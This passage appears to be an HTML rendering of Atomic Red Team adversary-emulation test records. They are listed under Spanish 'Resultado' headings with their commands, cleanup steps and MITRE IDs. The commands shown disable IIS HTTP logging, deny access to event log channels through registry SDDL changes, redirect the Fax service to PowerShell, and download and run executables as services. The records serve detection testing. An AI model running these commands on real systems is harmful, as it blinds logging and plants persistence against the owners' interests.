<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: a957fb0f-1e85-49b2-a211-413366784b1e</li>
<li><strong>name</strong>: Disable Windows IIS HTTP Logging via PowerShell</li>
<li><strong>description</strong>: Disables HTTP logging on a Windows IIS web server as seen by Threat Group 3390 (Bronze Union).
This action requires HTTP logging configurations in IIS to be unlocked.</li>
</ul>
<p>Use the cleanup commands to restore some default auditpol settings (your original settings will be lost)</p>
<ul>
<li><strong>platforms</strong>: ['windows']</li>
<li>
<p><strong>command</strong>: set-WebConfigurationProperty -PSPath "IIS:\Sites#{website_name}\" -filter "system.webServer/httpLogging" -name dontLog -value $true</p>
</li>
<li>
<p><strong>prereq_command</strong>: </p>
</li>
<li><strong>get_prereq_command</strong>: </li>
<li>
<p><strong>cleanup_command</strong>: if(Test-Path "C:\Windows\System32\inetsrv\appcmd.exe"){
  C:\Windows\System32\inetsrv\appcmd.exe set config "#{website_name}" /section:httplogging /dontLog:false *&gt;$null
}</p>
</li>
<li>
<p><strong>mitre_id</strong>: T1562.002</p>
</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: 8e81d090-0cd6-4d46-863c-eec11311298f</li>
<li><strong>name</strong>: Modify Event Log Channel Access Permissions via Registry - PowerShell</li>
<li><strong>description</strong>: This test simulates an adversary modifying access permissions for a Windows Event Log Channel by altering the "ChannelAccess" registry value. Specifically, it changes the Security Descriptor Definition Language (SDDL) string. These modifications can restrict or grant access to specific users or groups, potentially aiding in defense evasion by controlling who can view or modify a event log channel.
Upon execution, the user shouldn't be able to access the event log channel via the event viewer or via utilities such as "Get-EventLog" or "wevtutil".</li>
<li><strong>platforms</strong>: ['windows']</li>
<li><strong>command</strong>: Set-ItemProperty -Path #{ChannelPath} -Name "ChannelAccess" -Value "O:SYG:SYD:(D;;0x1;;;WD)"
Restart-Service -Name EventLog -Force -ErrorAction Ignore </li>
<li><strong>prereq_command</strong>: </li>
<li><strong>get_prereq_command</strong>: </li>
<li><strong>cleanup_command</strong>: Set-ItemProperty -Path #{ChannelPath} -Name "ChannelAccess" -Value "O:BAG:SYD:(A;;0x2;;;S-1-15-2-1)(A;;0x2;;;S-1-15-3-1024-3153509613-960666767-3724611135-2725662640-12138253-543910227-1950414635-4190290187)(A;;0xf0007;;;SY)(A;;0x7;;;BA)(A;;0x7;;;SO)(A;;0x3;;;IU)(A;;0x3;;;SU)(A;;0x3;;;S-1-5-3)(A;;0x3;;;S-1-5-33)(A;;0x1;;;S-1-5-32-573)"
Restart-Service -Name EventLog -Force -ErrorAction Ignore</li>
<li><strong>mitre_id</strong>: T1562.002</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: 85e6eff8-3ed4-4e03-ae50-aa6a404898a5</li>
<li><strong>name</strong>: Modify Event Log Channel Access Permissions via Registry 2 - PowerShell</li>
<li><strong>description</strong>: This test simulates an adversary modifying access permissions for a Windows Event Log Channel by altering the "ChannelAccess" registry value. Specifically, it changes the Security Descriptor Definition Language (SDDL) string. These modifications can restrict or grant access to specific users or groups, potentially aiding in defense evasion by controlling who can view or modify a event log channel.
Upon execution, the user shouldn't be able to access the event log channel via the event viewer or via utilities such as "Get-EventLog" or "wevtutil".</li>
<li><strong>platforms</strong>: ['windows']</li>
<li><strong>command</strong>: New-Item -Path #{ChannelPath} -Force
Set-ItemProperty -Path #{ChannelPath} -Name "ChannelAccess" -Value "O:SYG:SYD:(D;;0x1;;;WD)"
Restart-Service -Name EventLog -Force -ErrorAction Ignore</li>
<li><strong>prereq_command</strong>: </li>
<li><strong>get_prereq_command</strong>: </li>
<li><strong>cleanup_command</strong>: Remove-Item -Path #{ChannelPath} -Force
Restart-Service -Name EventLog -Force -ErrorAction Ignore</li>
<li><strong>mitre_id</strong>: T1562.002</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: a0cb81f8-44d0-4ac4-a8f3-c5c7f43a12c1</li>
<li><strong>name</strong>: Modify Event Log Access Permissions via Registry - PowerShell</li>
<li><strong>description</strong>: This test simulates an adversary modifying access permissions for a Windows Event Log channel by setting the "CustomSD" registry value. Specifically, it changes the Security Descriptor Definition Language (SDDL) string. These modifications can restrict or grant access to specific users or groups, potentially aiding in defense evasion by controlling who can view or modify a event log channel.
Upon execution, the user shouldn't be able to access the event log channel via the event viewer or via utilities such as "Get-EventLog" or "wevtutil".</li>
<li><strong>platforms</strong>: ['windows']</li>
<li><strong>command</strong>: Set-ItemProperty -Path #{CustomSDPath} -Name "CustomSD" -Value "O:SYG:SYD:(D;;0x1;;;WD)"</li>
<li><strong>prereq_command</strong>: </li>
<li><strong>get_prereq_command</strong>: </li>
<li><strong>cleanup_command</strong>: Remove-ItemProperty -Path #{CustomSDPath} -Name "CustomSD"</li>
<li><strong>mitre_id</strong>: T1562.002</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: fe94a1c3-3e22-4dc9-9fdf-3a8bdbc10dc4</li>
<li><strong>name</strong>: List Process Main Windows - C# .NET</li>
<li><strong>description</strong>: Compiles and executes C# code to list main window titles associated with each process.</li>
</ul>
<p>Upon successful execution, powershell will download the .cs from the Atomic Red Team repo, and cmd.exe will compile and execute T1010.exe. Upon T1010.exe execution, expected output will be via stdout.</p>
<ul>
<li><strong>platforms</strong>: ['windows']</li>
<li><strong>command</strong>: C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe -out:#{output_file_name} "#{input_source_code}"</li>
</ul>
<h1>{output_file_name}</h1>
<ul>
<li>
<p><strong>prereq_command</strong>: if (Test-Path "#{input_source_code}") {exit 0} else {exit 1}</p>
</li>
<li>
<p><strong>get_prereq_command</strong>: New-Item -Type Directory (split-path "#{input_source_code}") -ErrorAction ignore | Out-Null
Invoke-WebRequest https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1010/src/T1010.cs -OutFile "#{input_source_code}"</p>
</li>
<li>
<p><strong>cleanup_command</strong>: del /f /q /s #{output_file_name} &gt;nul 2&gt;&amp;1</p>
</li>
<li>
<p><strong>mitre_id</strong>: T1010</p>
</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: ed366cde-7d12-49df-a833-671904770b9f</li>
<li><strong>name</strong>: Modify Fax service to run PowerShell</li>
<li>
<p><strong>description</strong>: This test will temporarily modify the service Fax by changing the binPath to PowerShell
and will then revert the binPath change, restoring Fax to its original state.
Upon successful execution, cmd will modify the binpath for <code>Fax</code> to spawn powershell. Powershell will then spawn.</p>
</li>
<li>
<p><strong>platforms</strong>: ['windows']</p>
</li>
<li>
<p><strong>command</strong>: sc config Fax binPath= "C:\windows\system32\WindowsPowerShell\v1.0\powershell.exe -noexit -c \"write-host 'T1543.003 Test'\""
sc start Fax</p>
</li>
<li>
<p><strong>prereq_command</strong>: </p>
</li>
<li><strong>get_prereq_command</strong>: </li>
<li><strong>cleanup_command</strong>: sc config Fax binPath= "C:\WINDOWS\system32\fxssvc.exe" &gt;nul 2&gt;&amp;1</li>
<li><strong>mitre_id</strong>: T1543.003</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: 981e2942-e433-44e9-afc1-8c957a1496b6</li>
<li><strong>name</strong>: Service Installation CMD</li>
<li>
<p><strong>description</strong>: Download an executable from github and start it as a service.
Upon successful execution, powershell will download <code>AtomicService.exe</code> from github. cmd.exe will spawn sc.exe which will create and start the service. Results will output via stdout.</p>
</li>
<li>
<p><strong>platforms</strong>: ['windows']</p>
</li>
<li>
<p><strong>command</strong>: sc.exe create #{service_name} binPath= "#{binary_path}" start=#{startup_type}  type=#{service_type}
sc.exe start #{service_name}</p>
</li>
<li>
<p><strong>prereq_command</strong>: if (Test-Path "#{binary_path}") {exit 0} else {exit 1}</p>
</li>
<li>
<p><strong>get_prereq_command</strong>: New-Item -Type Directory (split-path "#{binary_path}") -ErrorAction ignore | Out-Null
Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1543.003/bin/AtomicService.exe" -OutFile "#{binary_path}"</p>
</li>
<li>
<p><strong>cleanup_command</strong>: sc.exe stop #{service_name} &gt;nul 2&gt;&amp;1
sc.exe delete #{service_name} &gt;nul 2&gt;&amp;1</p>
</li>
<li>
<p><strong>mitre_id</strong>: T1543.003</p>
</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
